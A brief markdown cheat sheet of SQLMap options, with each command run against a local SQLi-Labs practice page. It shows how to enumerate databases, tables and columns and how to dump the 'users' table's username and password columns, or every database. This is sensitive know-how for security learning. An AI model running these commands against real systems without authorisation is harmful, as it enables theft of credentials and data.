# SQLMap
- Below are the common options comes with SqlMap :
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 --current-user`
  - `--current-user` option is used to get the current database user.
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 --dbs`
  - `--dbs` is used to get the list of databases.
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 -D security --tables`
  - `-D database_name --tables` is used to get the list of tables present in database named **security**.
  -  `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 -D security -T users --dump`
  - `-D security -T users --dump` is used to dump data of table **users** of database **security**.
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 -D security -T users --columns`
  - `-D security -T users --columns` is  used to show of structure of columns.
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 -D security -T users -C "username, password" --dump`
  - `-D security -T users -C "username, password" --dump` is used to dump only specified columns mentioned with -C.
  - `python sqlmap.py --wizard`
  - `--wizard` switch invokes the interactive setup wizard wherre SQLMap asks for things in details, one by one, starting with the injection URL.
  - `python sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=2 --dump-all`
  - `--dump-all` is used to dumps all the data present inside every single database accessible through the injection.
  
